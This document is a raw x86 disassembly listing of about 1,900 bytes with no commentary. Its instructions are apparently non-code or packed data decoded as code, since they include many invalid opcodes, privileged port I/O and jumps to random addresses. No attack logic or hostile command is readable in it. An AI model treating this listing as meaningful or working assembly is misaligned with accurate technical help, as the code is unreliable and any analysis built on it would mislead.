  40195c:	sub    cl,BYTE PTR [ebx+0x1eac0f5d]
  401962:	cmp    cl,bh
  401964:	stos   BYTE PTR es:[edi],al
  401965:	sbb    al,0x8
  401967:	lds    ebx,FWORD PTR [ecx]
  401969:	adc    eax,0x5bafec33
  40196e:	jnp    0x4018fd
  401970:	mov    ebx,0x635eff91
  401975:	loop   0x401976
  401977:	push   esi
  401978:	sbb    DWORD PTR [edx+0x56336e73],0xffffff8b
  40197f:	add    al,0x22
  401981:	imul   ecx
  401983:	push   ds
  401984:	sbb    al,0x2e
  401986:	out    0x98,eax
  401988:	xchg   edi,eax
  401989:	test   BYTE PTR [ebp-0x20],ah
  40198c:	out    0x9b,eax
  40198e:	fild   WORD PTR [edi+0x40]
  401991:	(bad)  
  401992:	jge    0x4019e6
  401994:	push   edx
  401995:	ins    BYTE PTR es:[edi],dx
  401996:	mov    eax,ds:0x62b9e81b
  40199b:	mov    ebp,0xd5d475c0
  4019a0:	ret    
  4019a1:	in     al,dx
  4019a2:	ds pop esp
  4019a4:	(bad)  
  4019a5:	cmc    
  4019a6:	inc    ebp
  4019a7:	imul   edx,DWORD PTR [esi],0x14843f89
  4019ad:	out    dx,al
  4019ae:	push   edi
  4019af:	nop
  4019b0:	adc    al,0xa7
  4019b2:	push   esp
  4019b3:	enter  0x6d96,0x49
  4019b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b8:	pop    ebp
  4019b9:	mov    dh,0x28
  4019bb:	aam    0x8f
  4019bd:	not    al
  4019bf:	push   eax
  4019c0:	sub    eax,DWORD PTR [esi+0xb]
  4019c3:	sbb    esp,DWORD PTR [edi]
  4019c5:	adc    BYTE PTR [ecx-0x4d9139ae],dh
  4019cb:	daa    
  4019cc:	stos   DWORD PTR es:[edi],eax
  4019cd:	and    DWORD PTR [ecx+0x1abaa3ff],esp
  4019d3:	es aas 
  4019d5:	popf   
  4019d6:	cmc    
  4019d7:	jp     0x401996
  4019d9:	and    dh,cl
  4019db:	sbb    ebx,DWORD PTR ds:0x55f03d55
  4019e1:	iret   
  4019e2:	inc    eax
  4019e3:	retf   0x7fc8
  4019e6:	push   esi
  4019e7:	sbb    DWORD PTR [edi-0x34],ebp
  4019ea:	and    BYTE PTR [esi-0x4aef1349],dl
  4019f0:	gs je  0x401a03
  4019f3:	inc    ebp
  4019f4:	add    eax,0x6bf18ea9
  4019f9:	mov    bh,0x27
  4019fb:	or     eax,0x205a8c19
  401a00:	jne    0x401a46
  401a02:	call   0xa7b1668b
  401a07:	push   ebx
  401a08:	adc    esp,DWORD PTR [ebx]
  401a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0b:	and    edi,DWORD PTR [ebx+0x57a66bf0]
  401a11:	(bad)  
  401a12:	in     eax,0x42
  401a14:	cvtps2pi mm3,QWORD PTR [edx-0x47]
  401a18:	push   ebx
  401a19:	push   0x550b47a0
  401a1e:	mov    al,ds:0xf599e681
  401a23:	out    0xc2,al
  401a25:	lahf   
  401a26:	xchg   edi,eax
  401a27:	xchg   esi,eax
  401a28:	aam    0x60
  401a2a:	imul   esi,ecx,0xc01e376e
  401a30:	mov    bh,0x25
  401a32:	cmp    BYTE PTR [edx-0x5d],ch
  401a35:	jl     0x401a75
  401a37:	xor    BYTE PTR gs:[esi],al
  401a3a:	add    BYTE PTR ds:0x6223713a,ah
  401a40:	dec    edx
  401a41:	xchg   DWORD PTR [ebx-0x30256298],esp
  401a47:	stos   DWORD PTR es:[edi],eax
  401a48:	test   DWORD PTR [edx+0x5c],edx
  401a4b:	mov    bh,0xc9
  401a4d:	inc    ebp
  401a4e:	mov    BYTE PTR [ecx],bh
  401a50:	ss mov bh,0xce
  401a53:	mov    edi,0x253276b
  401a58:	mov    edi,0x7e710acf
  401a5d:	movlhps xmm2,xmm7
  401a60:	inc    DWORD PTR [edi+ecx*4]
  401a63:	xchg   esp,eax
  401a64:	lods   eax,DWORD PTR ds:[esi]
  401a65:	int    0x4a
  401a67:	in     eax,dx
  401a68:	test   BYTE PTR [ecx+esi*1-0x108ea61f],0x82
  401a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a71:	fidiv  DWORD PTR ds:0x4625bc17
  401a77:	sub    edi,ebx
  401a79:	cld    
  401a7a:	pop    ds
  401a7b:	inc    ebp
  401a7c:	pop    esp
  401a7d:	cli    
  401a7e:	arpl   WORD PTR [eax],dx
  401a80:	dec    edi
  401a81:	sti    
  401a82:	and    BYTE PTR [edi],0x5f
  401a85:	fs je  0x401a65
  401a88:	outs   dx,BYTE PTR ds:[esi]
  401a89:	xor    BYTE PTR [ebp-0x24],0x76
  401a8d:	pop    ds
  401a8e:	mov    ebx,0x8fded142
  401a93:	daa    
  401a94:	ror    DWORD PTR [ecx+0x23],cl
  401a97:	pop    ecx
  401a98:	cmp    bh,ah
  401a9a:	and    DWORD PTR [ecx-0x4a1af9a5],ecx
  401aa0:	xchg   edx,eax
  401aa1:	iret   
  401aa2:	mov    ah,0xd5
  401aa4:	mov    al,0x14
  401aa6:	jae    0x401aad
  401aa8:	dec    esi
  401aa9:	cwde   
  401aaa:	cmp    eax,DWORD PTR [eax-0x7e]
  401aad:	mov    edx,0xef5e96f
  401ab2:	pop    es
  401ab3:	dec    ebx
  401ab4:	popa   
  401ab5:	push   edi
  401ab6:	add    BYTE PTR [esi-0x4fb9517d],bh
  401abc:	add    BYTE PTR [ebp+eiz*4+0x7555e0ca],ah
  401ac3:	adc    ch,0x7a
  401ac6:	(bad)  
  401ac7:	push   eax
  401ac8:	mov    edi,fs
  401aca:	outs   dx,DWORD PTR ds:[esi]
  401acb:	jmp    0x88165a98
  401ad0:	loopne 0x401b51
  401ad2:	test   BYTE PTR [ecx],0xdf
  401ad5:	pop    ebp
  401ad6:	sub    cl,BYTE PTR [eax+0x37c10c1f]
  401adc:	stos   DWORD PTR es:[edi],eax
  401add:	jle    0x401a98
  401adf:	iret   
  401ae0:	push   cs
  401ae1:	jmp    0xa7c7d299
  401ae6:	inc    esp
  401ae7:	adc    DWORD PTR [edi+0x5a],0x27f3ab08
  401aee:	test   BYTE PTR [edi+0x29],0xbd
  401af2:	push   es
  401af3:	mov    ebx,0xa6e3b886
  401af8:	and    cl,BYTE PTR [edx]
  401afa:	mov    ebp,0x57e72741
  401aff:	xchg   edx,eax
  401b00:	in     eax,dx
  401b01:	jl     0x401ae5
  401b03:	popa   
  401b04:	add    al,0x9
  401b06:	xchg   ebx,eax
  401b07:	pop    DWORD PTR fs:[edi]
  401b0a:	popa   
  401b0b:	dec    edx
  401b0c:	ret    0x1c35
  401b0f:	add    al,0xfe
  401b11:	repz adc bl,bl
  401b14:	fiadd  DWORD PTR [ebx]
  401b16:	jb     0x401b20
  401b18:	xor    DWORD PTR [edx+0x4e898903],0xf44ad2cc
  401b22:	fcomip st,st(7)
  401b24:	mov    ds:0x1bbaf0ff,al
  401b29:	mov    esp,0x63a11772
  401b2e:	lods   al,BYTE PTR ds:[esi]
  401b2f:	adc    eax,0x4be568ad
  401b34:	mov    esp,0xb7591179
  401b39:	mov    ds:0x4ab97280,al
  401b3e:	cmp    ebx,DWORD PTR [ecx-0x4070c274]
  401b44:	ret    0x5067
  401b47:	daa    
  401b48:	cmp    al,0x5d
  401b4a:	les    ebx,FWORD PTR [edi]
  401b4c:	seta   dh
  401b4f:	scas   al,BYTE PTR es:[edi]
  401b50:	shl    dl,cl
  401b52:	and    eax,0xb8ea1fd6
  401b57:	push   ss
  401b58:	in     eax,dx
  401b59:	into   
  401b5a:	lods   eax,DWORD PTR ds:[esi]
  401b5b:	or     BYTE PTR [ecx],ah
  401b5d:	mov    ecx,0x655d4470
  401b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b63:	ret    0xefb8
  401b66:	push   ebx
  401b67:	inc    ebx
  401b68:	stc    
  401b69:	xlat   BYTE PTR ds:[ebx]
  401b6a:	add    ecx,DWORD PTR ds:0xae28aa88
  401b70:	into   
  401b71:	push   eax
  401b72:	dec    ebp
  401b73:	nop
  401b74:	test   eax,0x44b6f1e9
  401b79:	fiadd  WORD PTR [esi+0x6a]
  401b7c:	ret    
  401b7d:	ds add al,0xab
  401b80:	push   es
  401b81:	in     eax,dx
  401b82:	push   ecx
  401b83:	pop    ecx
  401b84:	jno    0x401b3f
  401b86:	xchg   ebp,eax
  401b87:	mov    esp,0xfb9b7e81
  401b8c:	lds    esi,FWORD PTR [esi+eax*2]
  401b8f:	pushf  
  401b90:	add    al,0xa2
  401b92:	in     al,0xa9
  401b94:	popf   
  401b95:	sub    eax,0x4131e22
  401b9a:	adc    esi,DWORD PTR [edi+0x3]
  401b9d:	in     eax,dx
  401b9e:	mov    ds:0xa9487434,al
  401ba3:	jo     0x401c20
  401ba5:	ss pusha 
  401ba7:	sbb    al,BYTE PTR [ebx]
  401ba9:	in     eax,dx
  401baa:	pop    ds
  401bab:	cmp    DWORD PTR es:[edx],ebx
  401bae:	out    0x28,al
  401bb0:	xchg   cx,ax
  401bb2:	aas    
  401bb3:	push   ss
  401bb4:	mov    ebx,0x2b5fa722
  401bb9:	je     0x401b41
  401bbb:	mov    bh,0x5c
  401bbd:	add    eax,0x8e2800f
  401bc2:	scas   eax,DWORD PTR es:[edi]
  401bc3:	push   ds
  401bc4:	xor    BYTE PTR [ecx],bl
  401bc6:	xor    ch,dh
  401bc8:	fucomi st,st(1)
  401bca:	jp     0x401b75
  401bcc:	mov    dl,0xf6
  401bce:	cmp    al,0x3f
  401bd0:	aaa    
  401bd1:	mov    esp,0xa3366187
  401bd6:	(bad)  
  401bd7:	fnstsw WORD PTR [edx+0x36163826]
  401bdd:	shl    BYTE PTR [ebp+0x44d52cfd],cl
  401be3:	xor    DWORD PTR [ebx-0x6f],eax
  401be6:	push   es
  401be7:	(bad)  
  401be8:	pop    ecx
  401be9:	and    DWORD PTR [ebx],edi
  401beb:	adc    DWORD PTR [ecx-0x40],esi
  401bee:	rol    BYTE PTR [edx],cl
  401bf0:	in     eax,0x12
  401bf2:	inc    ebx
  401bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bf4:	mov    bl,0x19
  401bf6:	fs xchg esp,eax
  401bf8:	not    dl
  401bfa:	pop    edx
  401bfb:	shl    BYTE PTR [edi],cl
  401bfd:	cmp    ebp,DWORD PTR [ebp+0xac09e5a]
  401c03:	cmp    BYTE PTR [eax+0x70],cl
  401c06:	rep ins BYTE PTR es:[edi],dx
  401c08:	out    dx,eax
  401c09:	inc    edx
  401c0a:	pop    ss
  401c0b:	aam    0x7e
  401c0d:	add    ebx,edi
  401c0f:	rcl    DWORD PTR [edi+0x69],1
  401c12:	xor    al,BYTE PTR [edi+esi*1+0x1db2aa7f]
  401c19:	and    ah,dl
  401c1b:	sbb    dl,ch
  401c1d:	inc    edx
  401c1e:	xchg   edx,eax
  401c1f:	xor    al,0xc7
  401c21:	mov    bl,0x27
  401c23:	out    0x3f,eax
  401c25:	dec    esi
  401c26:	mov    ah,BYTE PTR [ebx]
  401c28:	(bad)  
  401c29:	xor    BYTE PTR [ebp+0x54e4824f],bl
  401c2f:	gs daa 
  401c31:	push   0xaaf90d13
  401c36:	cmp    bh,0x70
  401c39:	xor    DWORD PTR [edx-0x1c],esp
  401c3c:	repz mov al,0x69
  401c3f:	or     al,0x17
  401c41:	mov    bh,0x5e
  401c43:	xor    ah,dl
  401c45:	jnp    0x401c88
  401c47:	cmc    
  401c48:	mov    al,ds:0xb82e7d19
  401c4d:	mov    ah,0x40
  401c4f:	pop    edi
  401c50:	cli    
  401c51:	int3   
  401c52:	jle    0x401cbd
  401c54:	or     al,0x66
  401c56:	outs   dx,DWORD PTR ds:[esi]
  401c57:	imul   esp,DWORD PTR [ebx+0x2c],0xffffffe2
  401c5b:	data16 mov ch,0xa0
  401c5e:	xchg   ebp,eax
  401c5f:	and    DWORD PTR [esi+0x5b5f444e],ebp
  401c65:	test   BYTE PTR [eax],dh
  401c67:	nop
  401c68:	ins    BYTE PTR es:[edi],dx
  401c69:	fimul  WORD PTR [edx+ecx*8]
  401c6c:	mov    dh,BYTE PTR [eax+0x76]
  401c6f:	outs   dx,DWORD PTR ds:[esi]
  401c70:	lods   al,BYTE PTR ds:[esi]
  401c71:	mov    esp,ss
  401c73:	stc    
  401c74:	call   0x89ab:0xec240341
  401c7b:	xchg   ebx,eax
  401c7c:	fisub  DWORD PTR [edx]
  401c7e:	fldlg2 
  401c80:	push   eax
  401c81:	and    eax,0xb46c59ce
  401c86:	cmp    cl,BYTE PTR [eax-0x1b]
  401c89:	xor    edi,edi
  401c8b:	mov    dl,0xac
  401c8d:	ins    BYTE PTR es:[edi],dx
  401c8e:	jne    0x401c15
  401c90:	ror    DWORD PTR [ebp+edx*4+0x6eb1ffb1],cl
  401c97:	or     BYTE PTR [edi-0x31],dl
  401c9a:	mov    WORD PTR [edi+0x48],ss
  401c9d:	shr    DWORD PTR [ecx],0x2
  401ca0:	mov    eax,ds:0x369cf2fd
  401ca5:	lahf   
  401ca6:	sbb    al,0x86
  401ca8:	or     al,0x29
  401caa:	out    0xfd,al
  401cac:	xlat   BYTE PTR ds:[ebx]
  401cad:	mov    edx,0x7abdcaa4
  401cb2:	shl    BYTE PTR [eax],0x18
  401cb5:	stc    
  401cb6:	xchg   edx,eax
  401cb7:	jl     0x401c40
  401cb9:	sti    
  401cba:	add    bl,al
  401cbc:	mov    ds:0x708f9feb,eax
  401cc1:	pop    es
  401cc2:	sbb    BYTE PTR [eax+0x27a10397],ah
  401cc8:	dec    ecx
  401cc9:	les    ebx,FWORD PTR [esi-0x60e204d5]
  401ccf:	jecxz  0x401cb9
  401cd1:	outs   dx,BYTE PTR ds:[esi]
  401cd2:	bound  edi,QWORD PTR [esi]
  401cd4:	inc    ebp
  401cd5:	pusha  
  401cd6:	aas    
  401cd7:	sti    
  401cd8:	out    0x7a,al
  401cda:	test   BYTE PTR [eax-0x7e],bl
  401cdd:	mov    edi,edx
  401cdf:	fisubr WORD PTR [ecx+0x2f]
  401ce2:	aam    0x4d
  401ce4:	cmp    ecx,ebp
  401ce6:	lds    ebp,FWORD PTR [eax]
  401ce8:	and    al,0xe
  401cea:	sub    al,0xc3
  401cec:	mov    ds:0xcea73054,eax
  401cf1:	pop    es
  401cf2:	mov    ds:0x1038aa17,eax
  401cf7:	and    DWORD PTR [ebp-0x53a04b17],eax
  401cfd:	sti    
  401cfe:	mov    ecx,DWORD PTR [ebx]
  401d00:	pop    ds
  401d01:	xor    BYTE PTR [ecx],bl
  401d03:	int3   
  401d04:	in     eax,dx
  401d05:	hlt    
  401d06:	pushf  
  401d07:	jl     0x401c92
  401d09:	jb     0x401ce7
  401d0b:	mov    esi,0x70e1963a
  401d10:	mov    esi,0x9185eac
  401d15:	test   ecx,edi
  401d17:	jmp    0x401ce7
  401d19:	popf   
  401d1a:	pop    esi
  401d1b:	into   
  401d1c:	sub    eax,0x24214857
  401d21:	(bad)  
  401d22:	icebp  
  401d23:	in     eax,0xed
  401d25:	lea    ebp,[eax]
  401d27:	outs   dx,BYTE PTR ds:[esi]
  401d28:	inc    ebp
  401d29:	ds pop es
  401d2b:	sub    BYTE PTR [eax+0x5ed24888],0xd5
  401d32:	test   eax,0xa0f86565
  401d37:	cmp    al,0x34
  401d39:	inc    edi
  401d3a:	fucom  st(4)
  401d3c:	lea    ebp,[ecx-0x64]
  401d3f:	mov    al,ds:0x954a6284
  401d44:	mov    ebp,ebp
  401d46:	dec    esp
  401d47:	ror    BYTE PTR [ebp-0x77],cl
  401d4a:	ins    BYTE PTR es:[edi],dx
  401d4b:	jnp    0x401d4f
  401d4d:	fsubr  QWORD PTR [ebx+0x609c01c7]
  401d53:	ret    
  401d54:	pusha  
  401d55:	push   ebx
  401d56:	add    al,0x96
  401d58:	shr    BYTE PTR [ecx-0x75],0x8
  401d5c:	fst    DWORD PTR [edx]
  401d5e:	pop    ss
  401d5f:	(bad)  
  401d60:	push   esi
  401d61:	and    al,BYTE PTR [edi-0x49]
  401d64:	jg     0x401d83
  401d66:	lahf   
  401d67:	or     eax,0xe1f49b9a
  401d6c:	cmc    
  401d6d:	aas    
  401d6e:	push   ecx
  401d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d70:	jp     0x401db7
  401d72:	xor    DWORD PTR [esi],ebx
  401d74:	dec    ebp
  401d75:	outs   dx,DWORD PTR ds:[esi]
  401d76:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d78:	pop    ebp
  401d79:	sbb    esp,eax
  401d7b:	sbb    cl,BYTE PTR [edx-0x32566162]
  401d81:	in     al,0xaa
  401d83:	pop    edx
  401d84:	nop
  401d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d86:	(bad)  
  401d87:	div    bh
  401d89:	fldl2e 
  401d8b:	clc    
  401d8c:	retf   0x460c
  401d8f:	push   esi
  401d90:	cmc    
  401d91:	pop    ds
  401d92:	stos   DWORD PTR es:[edi],eax
  401d93:	add    al,0x7d
  401d95:	or     BYTE PTR [eax],ch
  401d97:	cmp    ebp,DWORD PTR [edx-0x35]
  401d9a:	cmp    al,0x62
  401d9c:	pop    ds
  401d9d:	cli    
  401d9e:	lea    edx,[edx-0x5f]
  401da1:	jb     0x401d9d
  401da3:	es aam 0xff
  401da6:	cmp    ebp,DWORD PTR [edi-0x20b61d53]
  401dac:	add    eax,DWORD PTR [eax-0x41c4f164]
  401db2:	sub    al,0xa1
  401db4:	mov    ebx,0x3b4b18f5
  401db9:	sti    
  401dba:	in     al,0xb1
  401dbc:	adc    edx,edi
  401dbe:	or     edi,DWORD PTR [ebx-0x9]
  401dc1:	push   es
  401dc2:	stc    
  401dc3:	cs arpl si,di
  401dc6:	shl    DWORD PTR [ebp+0x64],1
  401dc9:	stos   BYTE PTR es:[edi],al
  401dca:	fst    st(5)
  401dcc:	sbb    eax,0x2f434a1
  401dd1:	pop    ss
  401dd2:	or     ebx,DWORD PTR ds:0xbc1df26e
  401dd8:	mov    dl,0xdd
  401dda:	icebp  
  401ddb:	je     0x401e32
  401ddd:	imul   esp,esi,0x16
  401de0:	neg    DWORD PTR [eax]
  401de2:	aas    
  401de3:	mov    ds:0xfd2e06ec,eax
  401de8:	cwde   
  401de9:	xchg   esi,eax
  401dea:	(bad)  
  401deb:	shl    DWORD PTR [ebp+0x38483c1c],1
  401df1:	out    dx,eax
  401df2:	inc    edi
  401df3:	fwait
  401df4:	je     0x401e1f
  401df6:	jl     0x401da6
  401df8:	in     al,0xa9
  401dfa:	dec    esp
  401dfb:	sub    DWORD PTR [edi],esi
  401dfd:	cmc    
  401dfe:	cwde   
  401dff:	push   ebx
  401e00:	adc    al,0xe2
  401e02:	xchg   DWORD PTR [edx-0x4958e42b],esp
  401e08:	or     dh,BYTE PTR [edx+0x36]
  401e0b:	mov    eax,0x1fa45f33
  401e10:	cdq    
  401e11:	fist   WORD PTR [esi-0x7b769ee2]
  401e17:	lods   al,BYTE PTR ds:[esi]
  401e18:	sub    BYTE PTR ds:0xff97866d,ah
  401e1e:	adc    esi,DWORD PTR [ebx-0x4b779159]
  401e24:	jmp    0xe8dd:0xa0a97470
  401e2b:	xor    cl,BYTE PTR [ecx-0x7dfa5e56]
  401e31:	or     eax,ecx
  401e33:	and    eax,0xac5c9904
  401e38:	inc    esi
  401e39:	leave  
  401e3a:	pop    eax
  401e3b:	mov    bl,0xc9
  401e3d:	fcmovb st,st(5)
  401e3f:	loop   0x401e2a
  401e41:	pop    ebp
  401e42:	repnz and BYTE PTR [esi-0x53c59291],al
  401e49:	inc    esp
  401e4a:	hlt    
  401e4b:	mov    WORD PTR [edi-0x38],?
  401e4e:	mov    ebx,DWORD PTR [ebp-0x2ba0bcac]
  401e54:	inc    edi
  401e55:	mov    bl,0x66
  401e57:	out    dx,eax
  401e58:	xlat   BYTE PTR ds:[ebx]
  401e59:	cmp    BYTE PTR [ebp+0x142c3c76],ch
  401e5f:	add    DWORD PTR [eax],edx
  401e61:	cmp    eax,0xf8132b4
  401e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e67:	adc    bh,bh
  401e69:	std    
  401e6a:	mov    esp,0xdea9006f
  401e6f:	pop    edi
  401e70:	xor    BYTE PTR [ebx+0x4d],dh
  401e73:	imul   DWORD PTR [edx]
  401e75:	ss sub al,0xc
  401e78:	dec    ecx
  401e79:	jmp    0x401e62
  401e7b:	sub    BYTE PTR [esi+0x17],dl
  401e7e:	jmp    0xb284a120
  401e83:	fistp  WORD PTR [edx+ebp*4+0x7d]
  401e87:	or     eax,0x32c60930
  401e8c:	mov    dh,cl
  401e8e:	rol    BYTE PTR [ebx],1
  401e90:	jb     0x401ea8
  401e92:	sbb    BYTE PTR [ecx-0x2512722f],al
  401e98:	jp     0x401ea0
  401e9a:	sbb    BYTE PTR [edi+0x7680bad8],ah
  401ea0:	retf   
  401ea1:	loope  0x401e7b
  401ea3:	in     eax,0xa8
  401ea5:	das    
  401ea6:	call   FWORD PTR [edx-0x7]
  401ea9:	add    eax,DWORD PTR [ebx]
  401eab:	shl    BYTE PTR [ecx],1
  401ead:	jb     0x401e7a
  401eaf:	dec    ebx
  401eb0:	xor    BYTE PTR [ebp+0x22920b42],al
  401eb6:	ds mov edx,ds
  401eb9:	(bad)  
  401eba:	mov    eax,ds:0x35881830
  401ebf:	out    0xd6,eax
  401ec1:	das    
  401ec2:	jmp    0xbfa3:0x95f6d346
  401ec9:	sahf   
  401eca:	test   ebx,eax
  401ecc:	pop    es
  401ecd:	mov    ch,0xff
  401ecf:	xchg   ebx,eax
  401ed0:	(bad)  
  401ed1:	jne    0x401e7d
  401ed3:	cmc    
  401ed4:	lds    eax,FWORD PTR [eax-0x2c626451]
  401eda:	retf   0x2064
  401edd:	imul   esp,ebx,0xceb32657
  401ee3:	cld    
  401ee4:	mov    cl,0xa8
  401ee6:	push   cs
  401ee7:	cmp    ah,ch
  401ee9:	cwde   
  401eea:	in     eax,0xbc
  401eec:	sbb    dl,BYTE PTR [ebx-0x43fc675c]
  401ef2:	or     BYTE PTR [edx+edx*1-0x33],bh
  401ef6:	sub    edi,DWORD PTR [edi+0x15]
  401ef9:	and    eax,0xf0a1a01b
  401efe:	jg     0x401e99
  401f00:	int3   
  401f01:	cwde   
  401f02:	mov    eax,ds:0xf4e5b7e2
  401f07:	das    
  401f08:	jge    0x401edf
  401f0a:	pop    esi
  401f0b:	xor    esi,DWORD PTR [eax-0x3d]
  401f0e:	fnstenv [edx+0x68]
  401f11:	add    eax,0xea96526
  401f16:	mov    ds:0x86ec20fc,eax
  401f1b:	xchg   esp,eax
  401f1c:	mov    ebp,DWORD PTR [ecx]
  401f1e:	jmp    0xab8722b6
  401f23:	ins    DWORD PTR es:[edi],dx
  401f24:	mov    bh,0x57
  401f26:	add    al,0x58
  401f28:	rcl    BYTE PTR [edx],cl
  401f2a:	xchg   DWORD PTR [eax+0x65],esp
  401f2d:	inc    edx
  401f2e:	mov    DWORD PTR ds:0xc60c9550,esp
  401f34:	adc    al,0x1c
  401f36:	call   0xb963347d
  401f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f3c:	jmp    0xf561:0x12479795
  401f43:	hlt    
  401f44:	mov    ch,dh
  401f46:	sub    DWORD PTR [ebx],edi
  401f48:	sbb    ecx,DWORD PTR [edi+eiz*1-0x69]
  401f4c:	push   esp
  401f4d:	mov    dh,0x37
  401f4f:	addr16 pop es
  401f51:	out    0x9,eax
  401f53:	mov    bh,0x72
  401f55:	add    ecx,DWORD PTR [eax+0x1a]
  401f58:	cmp    BYTE PTR [esi+0x22dc6518],al
  401f5e:	push   esi
  401f5f:	xchg   edi,eax
  401f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f61:	fist   WORD PTR [esi+0x37]
  401f64:	jb     0x401f94
  401f66:	imul   BYTE PTR [edi+0x6ebb2ca3]
  401f6c:	imul   ebx,DWORD PTR [ebp-0xb],0xffffffac
  401f70:	inc    ecx
  401f71:	sbb    al,0xe2
  401f73:	mov    edi,0x4ada08ea
  401f78:	into   
  401f79:	or     al,0x19
  401f7b:	cwde   
  401f7c:	scas   al,BYTE PTR es:[edi]
  401f7d:	fsubr  st,st(0)
  401f7f:	stc    
  401f80:	jle    0x401f0e
  401f82:	dec    edi
  401f83:	inc    edi
  401f84:	cmp    bh,BYTE PTR [edi+0x4d0a5e99]
  401f8a:	mov    ebx,0x8619cc97
  401f8f:	mov    al,al
  401f91:	aad    0x79
  401f93:	arpl   WORD PTR [ecx-0x4e],ax
  401f96:	fidiv  DWORD PTR [eax+0x69]
  401f99:	jp     0x401f8b
  401f9b:	cmp    eax,0xbf763bbc
  401fa0:	loopne 0x40201c
  401fa2:	in     al,0x56
  401fa4:	pop    edx
  401fa5:	fsub   QWORD PTR [eax]
  401fa7:	test   al,0x7c
  401fa9:	or     edi,ebx
  401fab:	jmp    0x3a11:0x809913d7
  401fb2:	mov    ebp,0x41c0935e
  401fb7:	out    dx,al
  401fb8:	mov    WORD PTR [edi],?
  401fba:	ins    DWORD PTR es:[edi],dx
  401fbb:	cs pop ebp
  401fbd:	cmp    BYTE PTR [ecx-0x6319f372],0x3e
  401fc4:	push   cs
  401fc5:	pop    es
  401fc6:	popf   
  401fc7:	pop    ebp
  401fc8:	mov    ebp,0xb43f4a08
  401fcd:	mov    WORD PTR [edi],ds
  401fcf:	pop    edx
  401fd0:	jg     0x401fdf
  401fd2:	add    DWORD PTR [ecx+0x6c],ecx
  401fd5:	sbb    dh,BYTE PTR [ebp+0x35]
  401fd8:	inc    esi
  401fd9:	cld    
  401fda:	lahf   
  401fdb:	sub    bh,BYTE PTR [esp+ecx*1-0x1]
  401fdf:	imul   esp,DWORD PTR [ecx],0x14
  401fe2:	leave  
  401fe3:	push   esp
  401fe4:	add    BYTE PTR [ebx+0x5749a95c],bl
  401fea:	or     eax,0xbea53d04
  401fef:	retf   
  401ff0:	mov    DWORD PTR ds:0x3d8d2114,ebp
  401ff6:	xchg   ecx,eax
  401ff7:	inc    ecx
  401ff8:	add    eax,0xb7075e75
  401ffd:	and    al,0x5b
  401fff:	sbb    ch,BYTE PTR [ebp+ecx*8+0x63505dac]
  402006:	jge    0x40200b
  402008:	adc    al,ch
  40200a:	mov    cl,BYTE PTR [ecx]
  40200c:	in     eax,0xcd
  40200e:	sub    ebx,DWORD PTR [eax+0x1e]
  402011:	outs   dx,DWORD PTR ds:[esi]
  402012:	sbb    ebx,esi
  402014:	hlt    
  402015:	ffree  st(3)
  402017:	inc    esp
  402018:	mov    ecx,0x9dc5bf5a
  40201d:	cmp    al,0xf6
  40201f:	ja     0x40201c
  402021:	dec    edi
  402022:	xor    ecx,0x7566d560
  402028:	imul   ebx,DWORD PTR [edx+0x2f59fe0a],0x3dade83a
  402032:	stc    
  402033:	adc    eax,edx
  402035:	out    0x9e,al
  402037:	sub    eax,0xd7dcdac2
  40203c:	push   edx
  40203d:	xchg   ebp,eax
  40203e:	pop    ebp
  40203f:	inc    eax
  402040:	pop    es
  402041:	rcr    DWORD PTR [esi-0x3f74dc36],1
  402047:	cmp    al,0x21
  402049:	loope  0x402074
  40204b:	push   edi
  40204c:	adc    eax,0x6bf97b3a
  402051:	bound  eax,QWORD PTR [ecx]
  402053:	stc    
  402054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402055:	cmp    eax,0x7a3347b8
  40205a:	mov    eax,ds:0xf0f2e8ec
  40205f:	loopne 0x40205a
  402061:	jns    0x4020b2
  402063:	fisttp DWORD PTR [eax]
  402065:	loop   0x402066
  402067:	mov    al,BYTE PTR [esi+edx*2+0x21]
  40206b:	addr16 adc eax,0x854bf9d6
  402071:	stc    
  402072:	pushf  
  402073:	mov    cl,BYTE PTR [esi+0x55]
  402076:	xor    BYTE PTR [ebx+0x74],ah
  402079:	enter  0x6c52,0x4c
  40207d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40207e:	dec    edi
  40207f:	sahf   
  402080:	out    0xb8,eax
  402082:	push   eax
  402083:	lods   al,BYTE PTR ds:[esi]
  402084:	(bad)  
  402086:	dec    ecx
  402087:	jae    0x40208e
  402089:	sbb    ah,al
  40208b:	mov    al,ds:0x1290c45c
  402090:	mov    DWORD PTR [ecx],ecx
  402092:	out    dx,al
  402093:	jae    0x402080
  402095:	mov    esp,0xf9eefcc9
  40209a:	nop
  40209b:	call   0x9cd48b6
  4020a0:	mov    ch,0xa2
  4020a2:	pushf  
  4020a3:	and    DWORD PTR [ecx+0x78],edx
  4020a6:	lods   al,BYTE PTR ds:[esi]
  4020a7:	popa   
  4020a8:	push   esi
  4020a9:	cmp    eax,0x39f57986
  4020ae:	aam    0x7c
  4020b0:	jae    0x4020af
  4020b2:	jge    0x4020e8
  4020b4:	xchg   ebp,eax
  4020b5:	aam    0xce
  4020b7:	imul   edi,DWORD PTR [ecx-0x42cadac1],0xfa841af5
  4020c1:	mov    dh,0x55
  4020c3:	mov    esp,0x47258872
  4020c8:	xchg   ebx,eax
  4020c9:	lods   al,BYTE PTR ds:[esi]
  4020ca:	in     al,0x57
  4020cc:	push   edx
  4020cd:	push   ebx
  4020ce:	xor    dh,BYTE PTR [esi-0x46]
  4020d1:	xor    eax,0x2c72118
  4020d6:	and    al,0xd5
  4020d8:	xchg   ebp,eax
  4020d9:	pop    esi
  4020da:	adc    DWORD PTR ds:0xb6f98705,0x9bc66507
  4020e4:	aad    0xb4
  4020e6:	aas    
  4020e7:	ret    
  4020e8:	shl    esp,0x6f
  4020eb:	les    ebp,FWORD PTR [ecx]
  4020ed:	and    dl,dh
  4020ef:	pop    ecx
  4020f0:	add    eax,DWORD PTR [edx]
